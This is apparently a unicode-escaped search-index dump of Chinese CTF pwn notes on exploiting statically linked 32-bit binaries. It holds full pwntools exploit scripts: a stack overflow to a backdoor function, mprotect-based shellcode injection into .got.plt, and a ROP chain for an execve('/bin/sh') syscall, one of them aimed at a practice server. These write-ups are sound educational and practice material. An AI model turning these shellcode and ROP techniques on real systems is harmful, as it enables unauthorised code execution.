\u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32 ( read_addr ) + p32 ( got_plt ) + p32 ( 0 ) + p32 ( got_plt ) + p32 ( 0x200 ) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a' * 0x38 payload += p32 ( mprotect_addr ) + p32 ( pop3_ret ) + p32 ( got_plt ) + p32 ( 0x200 ) + p32 ( 0x7 ) payload += p32 ( read_addr ) + p32 ( got_plt ) + p32 ( 0 ) + p32 ( got_plt ) + p32 ( 0x200 ) exp \u00b6 \u4ec5\u6808\u6ea2\u51fa \u00b6 from pwn import * context . log_level = 'debug' p = process ( \"./get_started_3dsctf_2016\" ) #p = remote(\"node3.buuoj.cn\",26536) elf = ELF ( \"./get_started_3dsctf_2016\" ) get_flag = elf . sym [ 'get_flag' ] payload = 'a' * 0x38 # + 'b'*0x4 payload += p32 ( get_flag ) + p32 ( 0xdeadbeef ) + p32 ( 0x308CD64F ) + p32 ( 0x195719D1 ) #p.recvuntil(\"Qual\") gdb . attach ( p ) p . sendline ( payload ) p . interactive () \u6808\u6ea2\u51fa+mprotect \u00b6 \u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF ( \"./get_started_3dsctf_2016\" ) # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf . plt [ 'read' ] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf . sym [ 'read' ] # \u65b9\u6cd5\u4e00 puts_plt = elf . symbols [ 'read' ] # \u65b9\u6cd5\u4e8c from pwn import * context . log_level = 'debug' p = process ( \"./get_started_3dsctf_2016\" ) #p = remote(\"node3.buuoj.cn\",28471) elf = ELF ( \"./get_started_3dsctf_2016\" ) pop3_ret = 0x804951D shellcode = asm ( shellcraft . sh (), arch = 'i386' , os = 'linux' ) mprotect_addr = elf . symbols [ 'mprotect' ] read_addr = elf . symbols [ 'read' ] got_plt = 0x80EB000 payload = 'a' * 0x38 payload += p32 ( mprotect_addr ) + p32 ( pop3_ret ) + p32 ( got_plt ) + p32 ( 0x200 ) + p32 ( 0x7 ) payload += p32 ( read_addr ) + p32 ( got_plt ) + p32 ( 0 ) + p32 ( got_plt ) + p32 ( 0x200 ) #payload += p32(got_plt) gdb . attach ( p ) p . sendline ( payload ) p . sendline ( shellcode ) p . interactive () \u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300 \u00b6 32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002 \u5b9e\u9a8c\u4e09\uff1acmcc_simplerop \u00b6 \u8003\u70b9\uff1a\u9759\u6001\u94fe\u63a5\u3001\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u6808\u6ea2\u51fa \u5206\u6790 \u00b6 \u4fdd\u62a4\u60c5\u51b5 \u00b6 32 \u4f4d\u7a0b\u5e8f\uff0cNX \u4fdd\u62a4 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u6f0f\u6d1e\u51fd\u6570 \u00b6 main \u4e2d\u6ea2\u51fa\uff0c\u6ea2\u51fa\u957f\u5ea6\u633a\u5927\u7684\uff1a int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [esp+1Ch] [ebp-14h] puts ( \"ROP is easy is'nt it ?\" ); printf ( \"Your input :\" ); fflush ( stdout ); return read ( 0 , & v4 , 0x64 ); } \u601d\u8def \u00b6 \u4e4b\u524d\u9047\u5230 get_started_3dsctf_2016 \u7684\u65f6\u5019\u60c5\u51b5\u4e0e\u8fd9\u6761\u9898\u76ee\u770b\u4e0a\u53bb\u7c7b\u4f3c\uff0c\u7528\u7684\u662f mprotect \u7ed9\u5185\u5b58\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u7136\u540e\u5199\u5165 shellcode \u3002\u5b9e\u9645\u64cd\u4f5c\u4e00\u4e0b\u8fd9\u6761\u9898\u76ee\uff0cbss \u3001 got.plt \u4e24\u4e2a\u6bb5\u4fee\u6539\u4e0d\u6210\u529f\uff0c\u6700\u540e\u770b\u5927\u4f6c wp \u77e5\u9053\u7528 \u7cfb\u7edf\u8c03\u7528\u53f7 \u3002\u4e4b\u524d\u4e5f\u505a\u8fc7\u4e00\u6761\u9898\u76ee\u4e5f\u662f\u7528\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u53ef\u4ee5\u5957\u7528\u90a3\u4e2a\u601d\u8def\u3002 \u4ec0\u4e48\u662f\u7cfb\u7edf\u8c03\u7528\uff1f \u7ef4\u57fa\u767e\u79d1 \u7cfb\u7edf\u8c03\u7528\u53f7\u6709\u54ea\u4e9b\uff1f Linux\u7cfb\u7edf\u8c03\u7528 int 80h int 0x80 \u5c31\u662f\u6211\u4eec\u6700\u540e\u6267\u884c\u8fd9\u6761\u547d\u4ee4\uff1a int80(11,\"/bin/sh\",null,null) \u3002\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u662f\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e2d\u7684\uff08\u5bf9\u8fd9\u4e0d\u662f32\u4f4d\u7cfb\u7edf\u7684\u6808\u4f20\u53c2\uff09\u3002 \u56db\u4e2a\u53c2\u6570\u5bf9\u5e94\u5bc4\u5b58\u5668\u662f\uff1aeax\u3001ebx\u3001ecx\u3001edx payload = p32 ( pop_eax ) + p32 ( 0xb ) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( 0 ) + p32 ( binsh_addr ) payload += p32 ( int_80 ) \u7a0b\u5e8f\u4e2d\u6ca1\u6709\u627e\u5230 /bin/sh\\x00 \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u6784\u5efa\u8c03\u7528 read \u51fd\u6570\u5199\u5165\u5b57\u7b26\u4e32 payload = 'a' * 0x20 + p32 ( read_addr ) + p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( binsh_addr ) + p32 ( 0x8 ) exp \u00b6 #encoding:utf-8 from pwn import * context . log_level = 'debug' p = remote ( 'node3.buuoj.cn' , 29604 ) #p = process(\"./simplerop\") int_80 = 0x80493e1 pop_eax = 0x80bae06 read_addr = 0x0806CD50 binsh_addr = 0x080EB584 pop_edx_ecx_ebx = 0x0806e850 payload = 'a' * 0x20 + p32 ( read_addr ) + p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( binsh_addr ) + p32 ( 0x8 ) payload += p32 ( pop_eax ) + p32 ( 0xb ) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( 0 ) + p32 ( binsh_addr ) payload += p32 ( int_80 ) #gdb.attach(p) p . sendline ( payload ) p . sendline ( '/bin/sh \\x00 ' ) p . interactive ()","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_1","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#get_started_3dsctf_2016","text":"\u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002","title":"\u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_2","text":"","title":"\u5206\u6790"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_3","text":"32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX 1 2 3 4 5 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_4","text":"\u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 2 .6.32, not stripped","title":"\u7f16\u8bd1\u60c5\u51b5"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_5","text":"main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main ( int argc , const char ** argv , const char ** envp ) { char v4 ; // [esp+4h] [ebp-38h] printf ( \"Qual a palavrinha magica? \" , v4 ); gets ( & v4 ); return 0 ; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag ( int a1 , int a2 ) { int v2 ; // eax int v3 ; // esi unsigned __int8 v4 ; // al int v5 ; // ecx unsigned __int8 v6 ; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen ( \"flag.txt\" , \"rt\" ); v3 = v2 ; v4 = getc ( v2 ); if ( v4 != 0xFF ) { v5 = ( char ) v4 ; do { putchar ( v5 ); v6 = getc ( v3 ); v5 = ( char ) v6 ; } while ( v6 != 255 ); } fclose ( v3 ); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_6","text":"\u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: ` /home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016 ' , file type elf32-i386. [ 0 ] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [ 1 ] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [ 2 ] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [ 21 ] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [ 22 ] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [ 23 ] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32 ( mprotect_addr ) + p32 ( got_plt ) + p32 ( 0x200 ) + p32 ( 0x7 ) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32 ( read_addr ) + p32 ( got_plt ) + p32 ( 0 ) + p32 ( got_plt ) + p32 ( 0x200 ) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a' * 0x38 payload += p32 ( mprotect_addr ) + p32 ( pop3_ret ) + p32 ( got_plt ) + p32 ( 0x200 ) + p32 ( 0x7 ) payload += p32 ( read_addr ) + p32 ( got_plt ) + p32 ( 0 ) + p32 ( got_plt ) + p32 ( 0x200 )","title":"\u601d\u8def"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#exp","text":"","title":"exp"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_7","text":"from pwn import * context . log_level = 'debug' p = process ( \"./get_started_3dsctf_2016\" ) #p = remote(\"node3.buuoj.cn\",26536) elf = ELF ( \"./get_started_3dsctf_2016\" ) get_flag = elf . sym [ 'get_flag' ] payload = 'a' * 0x38 # + 'b'*0x4 payload += p32 ( get_flag ) + p32 ( 0xdeadbeef ) + p32 ( 0x308CD64F ) + p32 ( 0x195719D1 ) #p.recvuntil(\"Qual\") gdb . attach ( p ) p . sendline ( payload ) p . interactive ()","title":"\u4ec5\u6808\u6ea2\u51fa"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#mprotect","text":"\u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF ( \"./get_started_3dsctf_2016\" ) # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf . plt [ 'read' ] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf . sym [ 'read' ] # \u65b9\u6cd5\u4e00 puts_plt = elf . symbols [ 'read' ] # \u65b9\u6cd5\u4e8c from pwn import * context . log_level = 'debug' p = process ( \"./get_started_3dsctf_2016\" ) #p = remote(\"node3.buuoj.cn\",28471) elf = ELF ( \"./get_started_3dsctf_2016\" ) pop3_ret = 0x804951D shellcode = asm ( shellcraft . sh (), arch = 'i386' , os = 'linux' ) mprotect_addr = elf . symbols [ 'mprotect' ] read_addr = elf . symbols [ 'read' ] got_plt = 0x80EB000 payload = 'a' * 0x38 payload += p32 ( mprotect_addr ) + p32 ( pop3_ret ) + p32 ( got_plt ) + p32 ( 0x200 ) + p32 ( 0x7 ) payload += p32 ( read_addr ) + p32 ( got_plt ) + p32 ( 0 ) + p32 ( got_plt ) + p32 ( 0x200 ) #payload += p32(got_plt) gdb . attach ( p ) p . sendline ( payload ) p . sendline ( shellcode ) p . interactive ()","title":"\u6808\u6ea2\u51fa+mprotect"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#2017-pwn300","text":"32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#cmcc_simplerop","text":"\u8003\u70b9\uff1a\u9759\u6001\u94fe\u63a5\u3001\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u6808\u6ea2\u51fa","title":"\u5b9e\u9a8c\u4e09\uff1acmcc_simplerop"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_8","text":"","title":"\u5206\u6790"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_9","text":"32 \u4f4d\u7a0b\u5e8f\uff0cNX \u4fdd\u62a4 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 )","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_10","text":"main \u4e2d\u6ea2\u51fa\uff0c\u6ea2\u51fa\u957f\u5ea6\u633a\u5927\u7684\uff1a int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [esp+1Ch] [ebp-14h] puts ( \"ROP is easy is'nt it ?\" ); printf ( \"Your input :\" ); fflush ( stdout ); return read ( 0 , & v4 , 0x64 ); }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#_11","text":"\u4e4b\u524d\u9047\u5230 get_started_3dsctf_2016 \u7684\u65f6\u5019\u60c5\u51b5\u4e0e\u8fd9\u6761\u9898\u76ee\u770b\u4e0a\u53bb\u7c7b\u4f3c\uff0c\u7528\u7684\u662f mprotect \u7ed9\u5185\u5b58\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u7136\u540e\u5199\u5165 shellcode \u3002\u5b9e\u9645\u64cd\u4f5c\u4e00\u4e0b\u8fd9\u6761\u9898\u76ee\uff0cbss \u3001 got.plt \u4e24\u4e2a\u6bb5\u4fee\u6539\u4e0d\u6210\u529f\uff0c\u6700\u540e\u770b\u5927\u4f6c wp \u77e5\u9053\u7528 \u7cfb\u7edf\u8c03\u7528\u53f7 \u3002\u4e4b\u524d\u4e5f\u505a\u8fc7\u4e00\u6761\u9898\u76ee\u4e5f\u662f\u7528\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u53ef\u4ee5\u5957\u7528\u90a3\u4e2a\u601d\u8def\u3002 \u4ec0\u4e48\u662f\u7cfb\u7edf\u8c03\u7528\uff1f \u7ef4\u57fa\u767e\u79d1 \u7cfb\u7edf\u8c03\u7528\u53f7\u6709\u54ea\u4e9b\uff1f Linux\u7cfb\u7edf\u8c03\u7528 int 80h int 0x80 \u5c31\u662f\u6211\u4eec\u6700\u540e\u6267\u884c\u8fd9\u6761\u547d\u4ee4\uff1a int80(11,\"/bin/sh\",null,null) \u3002\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u662f\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e2d\u7684\uff08\u5bf9\u8fd9\u4e0d\u662f32\u4f4d\u7cfb\u7edf\u7684\u6808\u4f20\u53c2\uff09\u3002 \u56db\u4e2a\u53c2\u6570\u5bf9\u5e94\u5bc4\u5b58\u5668\u662f\uff1aeax\u3001ebx\u3001ecx\u3001edx payload = p32 ( pop_eax ) + p32 ( 0xb ) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( 0 ) + p32 ( binsh_addr ) payload += p32 ( int_80 ) \u7a0b\u5e8f\u4e2d\u6ca1\u6709\u627e\u5230 /bin/sh\\x00 \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u6784\u5efa\u8c03\u7528 read \u51fd\u6570\u5199\u5165\u5b57\u7b26\u4e32 payload = 'a' * 0x20 + p32 ( read_addr ) + p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( binsh_addr ) + p32 ( 0x8 )","title":"\u601d\u8def"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/#exp_1","text":"#encoding:utf-8 from pwn import * context . log_level = 'debug' p = remote ( 'node3.buuoj.cn' , 29604 ) #p = process(\"./simplerop\") int_80 = 0x80493e1 pop_eax = 0x80bae06 read_addr = 0x0806CD50 binsh_addr = 0x080EB584 pop_edx_ecx_ebx = 0x0806e850 payload = 'a' * 0x20 + p32 ( read_addr ) + p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( binsh_addr ) + p32 ( 0x8 ) payload += p32 ( pop_eax ) + p32 ( 0xb ) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32 ( pop_edx_ecx_ebx ) + p32 ( 0 ) + p32 ( 0 ) + p32 ( binsh_addr ) payload += p32 ( int_80 ) #gdb.attach(p) p . sendline ( payload ) p . sendline ( '/bin/sh \\x00 ' ) p . interactive ()","title":"exp"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/","text":"Pwn _IO_FILE \u00b6 IO \u7ed3\u6784\u4f53\u77e5\u8bc6 \u00b6 _IO_FILE \u7ed3\u6784 \u00b6 FILE \u5728 Linux \u7cfb\u7edf\u7684\u6807\u51c6 IO \u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002 FILE \u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884c fopen \u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411 FILE \u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u2014\u2014\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08eg:stdin=0;stdout=1)\u3002 \u5728\u6807\u51c6 I/O \u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1a 